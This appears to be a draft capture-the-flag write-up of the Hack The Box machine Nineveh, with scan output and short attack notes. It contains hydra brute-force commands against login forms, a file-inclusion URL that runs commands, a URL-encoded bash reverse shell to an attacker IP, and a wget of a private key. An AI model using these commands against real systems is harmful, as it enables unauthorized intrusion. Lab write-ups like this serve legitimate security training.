---
title: HTB Nineveh
author: kei5uke
draft: true
description: Writeup for HTB Nineveh
tags:
  - linux
  - writeup
---

# Nmap

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d182:94b8:0210:7992:bf01:e802:b26f:8639
|_SHA-1: 2275:b03e:27bd:1226:fdaa:8b0f:6de9:84f0:113b:42c0
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```

# HTTPS 443

![[HTB Nineveh - image.png]]

![[HTB Nineveh - image 1.png]]

`admin@nineveh.htb`

![[HTB Nineveh - image 2.png]]

Bruteforcing password:

`hydra -P /usr/share/wordlists/rockyou.txt nineveh.htb -s 443 http-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password' -S -l test`

`[443][http-post-form] host: nineveh.htb   login: test   password: password123`

This won’t let me create shell for some reason.

https://www.exploit-db.com/

![[HTB Nineveh - image 3.png]]

# HTTP 80

![[HTB Nineveh - image 4.png]]

![[HTB Nineveh - image 5.png]]

Brute force: `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt nineveh.htb -s 80 http-post-form '/department/login.php:username=^USER^&password=^PASS^:invalid username’`

https://www.mayhemcode.com/2025/10/php-strcmp-vulnerability-explained.html

![[HTB Nineveh - image 6.png]]

Access to the shell that you create on phpLiteAdmin

![[HTB Nineveh - image 7.png]]

`http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/test.php&cmd=whoami`

`http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/test.php&cmd=bash -c '%2Fbin%2Fbash -i >%26 %2Fdev%2Ftcp%2F10.10.14.208%2F4444 0>%261'`

# Shell as www-data

![[HTB Nineveh - image 8.png]]

`admin:1q2w3e4r5t`

![[HTB Nineveh - image 9.png]]

Interesting files

`/usr/sbin/report-reset.sh`

`/report/report-26-07-15:16:01.txt`

`/bin/bash /root/vulnScan.sh`

`/bin/sh /usr/bin/chkrootkit`

Found stegno `id_rsa`

![[HTB Nineveh - image 10.png]]

`wget http://10.10.14.208/amrois_key`

`ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no amrois@127.0.0.1 -i ./amrois_key`
